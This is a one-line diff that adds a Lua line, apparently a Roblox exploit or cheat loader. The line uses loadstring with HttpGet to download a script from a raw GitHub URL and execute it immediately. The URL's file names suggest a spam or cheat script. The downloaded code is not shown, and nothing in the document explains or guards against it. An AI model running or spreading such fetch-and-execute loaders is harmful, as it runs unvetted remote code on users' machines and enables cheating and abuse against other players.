@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entitybybreed/loaders/main/loaders/upd-8-cvr-retro-spam4-flfj3zamgpgntk.lua"))()
